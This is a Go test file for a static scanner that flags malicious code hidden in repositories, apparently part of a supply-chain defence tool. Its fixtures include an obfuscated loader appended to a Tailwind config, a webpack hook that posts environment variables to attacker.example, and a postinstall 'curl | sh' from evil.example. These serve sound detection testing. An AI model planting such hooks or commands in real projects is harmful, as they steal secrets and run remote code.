package analyze

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// writeRepo materializes files (relative path -> content) under a fresh temp
// dir and returns its path.
func writeRepo(t *testing.T, files map[string]string) string {
	t.Helper()
	root := t.TempDir()
	for rel, content := range files {
		full := filepath.Join(root, rel)
		if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
			t.Fatalf("mkdir: %v", err)
		}
		if err := os.WriteFile(full, []byte(content), 0o644); err != nil {
			t.Fatalf("write %s: %v", rel, err)
		}
	}
	return root
}

func hasFindingContaining(findings []Finding, substr string) bool {
	for _, f := range findings {
		if strings.Contains(f.Message, substr) || strings.Contains(f.Snippet, substr) {
			return true
		}
	}
	return false
}

func maxSeverity(findings []Finding) Severity {
	max := Info
	for _, f := range findings {
		if f.Severity > max {
			max = f.Severity
		}
	}
	return max
}

// TestScanCatchesTailwindConfigTrigger reproduces the trigger case: a
// malicious tailwind.config.ts where the real config ends at
// "} satisfies Config;" and an obfuscated, deobfuscate-and-run JS payload is
// appended on the SAME physical line, using global stashing of require and a
// Function-constructor string-eval. This must be flagged statically, without
// any code executing.
func TestScanCatchesTailwindConfigTrigger(t *testing.T) {
	payload := "global.o='*1-james';var _$d8bf=(function(i,p){return 1})(1,2);" +
		"global[_$d8bf(0)]=require;" +
		strings.Repeat("AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH1234567890abcdefghijklmnopqrstuvwxyz", 20) +
		"var uwg=tyH(Qio,FRF); uwg(4261); return 3312;" +
		"(function(){ return new Function('return 1')(); })();"
	line := `} satisfies Config;` + payload
	if len(line) <= longLineThreshold {
		t.Fatalf("test payload too short to trip the long-line threshold: %d chars", len(line))
	}

	root := writeRepo(t, map[string]string{
		"tailwind.config.ts": "import type {Config} from 'tailwindcss'\nconst config = {} " + line + "\nexport default config\n",
	})

	report, err := Scan(root)
	if err != nil {
		t.Fatalf("Scan: %v", err)
	}

	if !hasFindingContaining(report.Findings, "abnormally long line") {
		t.Errorf("expected an entropy finding for the abnormally long line, got: %+v", report.Findings)
	}
	if !hasFindingContaining(report.Findings, "deobfuscation-loader") {
		t.Errorf("expected a global-stash finding, got: %+v", report.Findings)
	}
	if !hasFindingContaining(report.Findings, "Function-constructor") {
		t.Errorf("expected a Function-constructor finding, got: %+v", report.Findings)
	}
	if maxSeverity(report.Findings) < High {
		t.Errorf("expected at least a High severity finding for this payload, max was %s", maxSeverity(report.Findings))
	}
}

// TestScanCatchesPlainTextExfiltration covers the non-obfuscated case: a
// network call reading and sending secrets in plain sight, hidden in a
// webpack config that has no legitimate reason to make a network call.
func TestScanCatchesPlainTextExfiltration(t *testing.T) {
	root := writeRepo(t, map[string]string{
		"webpack.config.js": `module.exports = {
  plugins: [{
    apply(compiler) {
      compiler.hooks.done.tap('x', () => {
        axios.post('https://attacker.example/collect', { env: JSON.stringify(process.env) });
      });
    }
  }]
};
`,
	})

	report, err := Scan(root)
	if err != nil {
		t.Fatalf("Scan: %v", err)
	}
	if !hasFindingContaining(report.Findings, "exfiltration, wherever it is hidden") {
		t.Errorf("expected a network+secrets co-occurrence finding, got: %+v", report.Findings)
	}
	if !hasFindingContaining(report.Findings, "no legitimate reason to make one") {
		t.Errorf("expected a network-in-config-file finding, got: %+v", report.Findings)
	}
	if maxSeverity(report.Findings) < High {
		t.Errorf("expected at least a High severity finding, max was %s", maxSeverity(report.Findings))
	}
}

// TestScanCleanRepoIsQuiet is the false-positive-control regression test: a
// normal small Node repo with nothing suspicious should not trip any
// High/Critical finding.
func TestScanCleanRepoIsQuiet(t *testing.T) {
	root := writeRepo(t, map[string]string{
		"package.json": `{"name": "demo", "version": "1.0.0", "scripts": {"build": "tsc"}}`,
		"index.js":     "function add(a, b) {\n  return a + b;\n}\nmodule.exports = { add };\n",
		"README.md":    "# demo\n\nA small demo package.\n",
	})

	report, err := Scan(root)
	if err != nil {
		t.Fatalf("Scan: %v", err)
	}
	if maxSeverity(report.Findings) >= High {
		t.Errorf("clean repo should not produce a High+ finding, got: %+v", report.Findings)
	}
}

// TestScanDoesNotFlagItsOwnDocs is the concrete false-positive-control case
// named in the plan: this project's own docs discuss example payloads
// (axios.get('https://evil/stage2')) as prose. A .md file containing that
// string must not be treated as a threat.
func TestScanDoesNotFlagItsOwnDocs(t *testing.T) {
	root := writeRepo(t, map[string]string{
		"docs/decisions.md": "The trace: what happens to a postinstall payload running\n" +
			"`axios.get('https://evil/stage2').then(r => eval(r.data))`?\n" +
			"Expected answer: the fetch dies on --network none.\n",
	})

	report, err := Scan(root)
	if err != nil {
		t.Fatalf("Scan: %v", err)
	}
	for _, f := range report.Findings {
		if f.Severity > Info {
			t.Errorf("prose file must be capped at Info severity, got %+v", f)
		}
	}
}

// TestScanExcludesMinifiedVendorBundles is a false-positive-control case: a
// large minified vendor bundle checked into dist/ should not trip the
// generic entropy check just for being long and dense.
func TestScanExcludesMinifiedVendorBundles(t *testing.T) {
	longMinified := strings.Repeat("var a=1,b=2,c=function(x){return x+1};", 20)
	root := writeRepo(t, map[string]string{
		"dist/vendor.min.js": longMinified + "\n",
	})

	report, err := Scan(root)
	if err != nil {
		t.Fatalf("Scan: %v", err)
	}
	if hasFindingContaining(report.Findings, "abnormally long line") {
		t.Errorf("minified vendor bundle should be excluded from the generic entropy check, got: %+v", report.Findings)
	}
}

// TestScanFlagsPostinstallCurlPipeShell covers the manifest analyzer: a
// postinstall hook piping a download into a shell must be flagged even
// though package.json is JSON, not source.
func TestScanFlagsPostinstallCurlPipeShell(t *testing.T) {
	root := writeRepo(t, map[string]string{
		"package.json": `{"name": "demo", "scripts": {"postinstall": "curl -sSL https://evil.example/i.sh | sh"}}`,
	})

	report, err := Scan(root)
	if err != nil {
		t.Fatalf("Scan: %v", err)
	}
	if !hasFindingContaining(report.Findings, "postinstall") {
		t.Errorf("expected a postinstall finding, got: %+v", report.Findings)
	}
	if maxSeverity(report.Findings) < High {
		t.Errorf("curl|sh in postinstall should be at least High, max was %s", maxSeverity(report.Findings))
	}
}

// TestScanReportsASTDisabledNeverSilent asserts the documented decision: a
// clean scan on this build is never presented as "AST found nothing";
// absence of AST is stated, not silent.
func TestScanReportsASTDisabledNeverSilent(t *testing.T) {
	root := writeRepo(t, map[string]string{"index.js": "console.log('hi');\n"})

	report, err := Scan(root)
	if err != nil {
		t.Fatalf("Scan: %v", err)
	}
	if report.ASTEnabled {
		t.Errorf("AST is not implemented in this slice; ASTEnabled must be false")
	}
	if report.ASTDisabledReason == "" {
		t.Errorf("ASTDisabledReason must always be set when ASTEnabled is false")
	}
}

// TestScanMissingRepoDirErrors asserts Scan fails fast on a bad path rather
// than silently returning an empty report.
func TestScanMissingRepoDirErrors(t *testing.T) {
	_, err := Scan(filepath.Join(t.TempDir(), "does-not-exist"))
	if err == nil {
		t.Fatal("expected an error for a missing repo dir")
	}
}

// TestDedupeFindingsCollapsesRepeats is a table-driven test for the
// dedupe pass in isolation.
func TestDedupeFindingsCollapsesRepeats(t *testing.T) {
	in := []Finding{
		{Analyzer: "regex", Category: "obfuscation", File: "a.js", Line: 1, Message: "m", Count: 1},
		{Analyzer: "regex", Category: "obfuscation", File: "a.js", Line: 5, Message: "m", Count: 1},
		{Analyzer: "regex", Category: "obfuscation", File: "b.js", Line: 1, Message: "m", Count: 1},
	}
	out := dedupeFindings(in)
	if len(out) != 2 {
		t.Fatalf("expected 2 collapsed findings, got %d: %+v", len(out), out)
	}
	for _, f := range out {
		if f.File == "a.js" && f.Count != 2 {
			t.Errorf("expected a.js finding to have Count 2, got %d", f.Count)
		}
	}
}

// TestCorrelateEscalatesTwoWeakCategories is a table-driven test for the
// correlation pass: two distinct weak-signal categories in one file should
// produce one additional High finding; a single category should not.
func TestCorrelateEscalatesTwoWeakCategories(t *testing.T) {
	tests := []struct {
		name  string
		in    []Finding
		wantN int
	}{
		{
			name: "two categories escalate",
			in: []Finding{
				{Category: "credential-path", Severity: Low, File: "a.js"},
				{Category: "recon", Severity: Info, File: "a.js"},
			},
			wantN: 1,
		},
		{
			name: "single category does not escalate",
			in: []Finding{
				{Category: "credential-path", Severity: Low, File: "a.js"},
			},
			wantN: 0,
		},
		{
			name: "all-Info categories do not escalate",
			in: []Finding{
				{Category: "recon", Severity: Info, File: "a.js"},
				{Category: "recon2", Severity: Info, File: "a.js"},
			},
			wantN: 0,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := correlate(tt.in)
			if len(got) != tt.wantN {
				t.Errorf("correlate() = %d findings, want %d: %+v", len(got), tt.wantN, got)
			}
		})
	}
}

func TestSeverityString(t *testing.T) {
	tests := []struct {
		sev  Severity
		want string
	}{
		{Info, "info"},
		{Low, "low"},
		{Medium, "medium"},
		{High, "high"},
		{Critical, "critical"},
	}
	for _, tt := range tests {
		if got := tt.sev.String(); got != tt.want {
			t.Errorf("Severity(%d).String() = %q, want %q", tt.sev, got, tt.want)
		}
	}
}
